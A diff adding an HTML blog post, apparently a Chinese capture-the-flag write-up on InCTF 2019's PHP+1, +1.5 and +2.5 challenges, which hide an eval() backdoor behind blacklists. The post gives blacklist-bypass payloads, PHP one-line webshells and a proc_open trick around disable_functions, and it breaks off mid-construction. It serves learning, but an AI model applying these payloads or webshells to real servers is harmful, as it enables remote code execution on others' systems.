@@ -1,0 +1,482 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,PHP,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/kanxi.jpg">
+  
+  <title>InCTF 2019 PHP+1,+1.5,+2.5三题复现 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+      <img class="avatar" src="/j.jpg">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="post" class="pure-menu-link">文章</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/archives" style="color:#202020;" class="pure-menu-link">归档</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories" style="color:#202020;" class="pure-menu-link">分类</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/tags" style="color:#202020;" class="pure-menu-link">标签</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="Web安全" class="pure-menu-link">Web安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Web安全基础/" style="color:#202020;" class="pure-menu-link">Web安全基础&amp;Tricks</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/PHP/" style="color:#202020;" class="pure-menu-link">PHP</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Java/" style="color:#202020;" class="pure-menu-link">Java</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Python/" style="color:#202020;" class="pure-menu-link">Python</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/JavaScript/" style="color:#202020;" class="pure-menu-link">JavaScript</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Web/" style="color:#202020;" class="pure-menu-link">WriteUp Web</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="二进制安全" class="pure-menu-link">二进制安全</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/二进制基础/" style="color:#202020;" class="pure-menu-link">二进制基础</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/Pwn/" style="color:#202020;" class="pure-menu-link">Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/C-C/" style="color:#202020;" class="pure-menu-link">C/C++</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Pwn/" style="color:#202020;" class="pure-menu-link">WriteUp Pwn</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/categories/WriteUp-Reverse/" style="color:#202020;" class="pure-menu-link">WriteUp Reverse</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="渗透测试" class="pure-menu-link">渗透测试</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="" style="color:#202020;" class="pure-menu-link">null</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="about" class="pure-menu-link">关于</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/about" style="color:#202020;" class="pure-menu-link">Mi1k7ea</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://blog.csdn.net/ski_12" style="color:#202020;" class="pure-menu-link">CSDN博客</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="/atom.xml" style="color:#202020;" class="pure-menu-link">订阅</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        InCTF 2019 PHP+1,+1.5,+2.5三题复现
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2019-10-20T03:01:43.000Z">
+        2019-10-20
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <p>这里复现下InCTF 2019 PHP+1,+1.5,+2.5这三道PHP的题目，考点是绕过WAF和disable_functions。</p>
+<h2 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h2><p>这三道题都是PHP代码审计题目，三题之间层层递进，区别在于自身写的WAF越来越严格地进行了过滤。</p>
+<p>先分别看看三个题目的源码。</p>
+<h3 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP+1"></a>PHP+1</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP+1</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，漏洞代码就是<code>eval($input);</code>，这里我们可以传入两个参数：input和thisfile。</p>
+<p>input参数：在eval执行input参数值之前，会经过check()函数的检测过滤处理。</p>
+<p>thisfile参数：会经过is_file()函数和file_existes()函数过滤；若调用is_file()函数判断输入参数值是文件则无法进入漏洞代码逻辑；若调用file_existes()函数判断该文件不存在，则同样无法进入漏洞代码逻辑；但这里我们可以通过传入一个已存在的目录路径来绕过这两个函数的检测；而绕过这两个函数之后，就是绕过check()函数的问题了。</p>
+<p>check()函数：先调用<code>get_defined_functions()[&#39;internal&#39;]</code>来获取系统内置函数作为黑名单，然后将该黑名单函数作为正则匹配input参数值进行检测，若匹配成功则返回true、不仅如此后续eval的漏洞代码逻辑；若匹配失败则返回false、进入漏洞代码逻辑。</p>
+<h3 id="PHP-1-5"><a href="#PHP-1-5" class="headerlink" title="PHP+1.5"></a>PHP+1.5</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php+1.5</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $input)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>和PHP+1相比，区别在于多了个黑名单正则<code>/exit|die|eval|\[|\]|\\\|\*|</code>|-|+|~|{|}|\”|\’/i`来匹配过滤input参数值，即将eval、die、exit（这几个不算PHP函数）及其他一些特殊字符进行了过滤，提高了利用的门槛。</p>
+<h3 id="PHP-2-5"><a href="#PHP-2-5" class="headerlink" title="PHP+2.5"></a>PHP+2.5</h3><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP+2.5</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $input)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">if</span> (strlen($input) &gt; <span class="number">100</span>) &#123;  <span class="comment">#That is random no. I took ;)</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"This is getting really large input..."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在PHP+1.5的基础上，增加了对input长度的限制，只有当input参数值的大小&lt;100字节时才能通过检测，提高了利用门槛。</p>
+<h2 id="0x02-题解"><a href="#0x02-题解" class="headerlink" title="0x02 题解"></a>0x02 题解</h2><p>首先，当然是要看下phpinfo相关信息，看看disable_functions有没有限制，因为这里相当于直接给了个有WAF的后门。三题所在的环境是一样的，我们从PHP+1入手。</p>
+<p>我们知道phpinfo()函数是系统内置函数，会直接被黑名单过滤掉；这里输入payload <code>?thisfile=c:/&amp;input=phpinfo()；</code>，thisfile参数值为指定一个已存在的目录路径：</p>
+<p><img src="/2019/10/20/InCTF-2019-PHP三题复现/1.png" alt=""></p>
+<p>这里我们可以使用字符串拼接的方式来绕过<code>?thisfile=c:/&amp;input=$a=&#39;php&#39;.&#39;info&#39;;$a();</code>：</p>
+<p><img src="/2019/10/20/InCTF-2019-PHP三题复现/2.png" alt=""></p>
+<p>接着扫描flag所在位置，由于三题环境是一样的，这里只需要在PHP+1环境中找到就行，用glob()函数即可，<code>?thisfile=c:/&amp;input=eval(&#39;echo im&#39;.&#39;plode(&quot; &quot;,glo&#39;.&#39;b(&quot;*&quot;));&#39;);</code>：</p>
+<p><img src="/2019/10/20/InCTF-2019-PHP三题复现/4.png" alt=""></p>
+<p>下面就有个问题了。</p>
+<p>这种字符串拼接方式在PHP+1中固然可行，但是到了后面两题就行不通了。这是因为后两题的第二个黑名单回会过滤特殊字符，包括单双引号等，但是我们发现<code>.</code>和<code>$</code>并未过滤。</p>
+<p>这里，我们从PHP一句话后门可以联想，后门的密码可以添加引号括起来也可以不添加，PHP程序都会将该值当成字符串类型，都能正常执行，如下面两句后门都能正常运行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[c]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因此，借鉴在这种方式，我们可以将payload改为<code>?thisfile=c:/&amp;input=$a=php.info;$a();</code>，这样虽然会在PHP运行后显示Notice注意信息，但并不会报错，会执行成功，下面直接在PHP+2.5中同样是可以执行的：</p>
+<p><img src="/2019/10/20/InCTF-2019-PHP三题复现/3.png" alt=""></p>
+<p>绕过了拼接字符串的坑后，我们直接查看disable_functions项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure>
+<p>虽然过滤了大多数的危险函数，但还有漏网之鱼——proc_open()函数。</p>
+<p><strong>proc_open()函数</strong></p>
+<p>执行一个命令，并且打开用来输入/输出的文件指针。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc_open ( string $cmd , <span class="keyword">array</span> $descriptorspec , <span class="keyword">array</span> &amp;$pipes [, string $cwd = <span class="keyword">NULL</span> [, <span class="keyword">array</span> $env = <span class="keyword">NULL</span> [, <span class="keyword">array</span> $other_options = <span class="keyword">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure>
+<p>该函数必须的3个参数：</p>
+<ul>
+<li>cmd：要执行的命令。</li>
+<li>descriptorspec：一个索引数组。</li>
+<li>pipes：将被置为索引数组，其中的元素是被执行程序创建的管道对应到PHP这一端的文件指针。</li>
+</ul>
+<p>Demo用法，用于Windows环境下弹出计算器：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">'calc.exe'</span>;</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),  <span class="comment">// 标准输入，子进程从此管道中读取数据</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),  <span class="comment">// 标准输出，子进程向此管道中写入数据</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>) <span class="comment">// 标准错误，子进程向此管道中写入数据</span></span><br><span class="line">);</span><br><span class="line">$pipes = <span class="keyword">null</span>;</span><br><span class="line">proc_open($cmd, $descriptorspec, $pipes);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>回到题目，发现下划线<code>_</code>被过滤了，要调用proc_open()函数还得进行拼接处理：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _</span></span><br><span class="line">$u=chr(<span class="number">95</span>);  --&gt;  $b=c.h.r;$u=$b(<span class="number">95</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// proc_open</span></span><br><span class="line">$e=proc.$u.open;</span><br></pre></td></tr></table></figure>
+<p>接着是如何给该函数传参。</p>
+<p>因为该传入的第二个参数是二维数组，其格式如下，如果直接构造会使payload长度超出限制：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>),</span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>),</span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+<p>但我们可以通过$_GET方式进行包括数组在内的传参，结合current()和next()函数来构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// current()和next()函数示例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">'AAA'</span>,<span class="string">'BBB'</span>,<span class="string">'CCC'</span>);</span><br><span class="line"><span class="keyword">echo</span> current($a);</span><br><span class="line"><span class="keyword">echo</span> next($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// proc_open()示例</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">proc_open(current($_GET),next($_GET), $j);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line">$k=$u.G.E.T;$g=$$k;</span><br></pre></td></tr></table></figure>
+<p>proc_open()函数构造：</p>
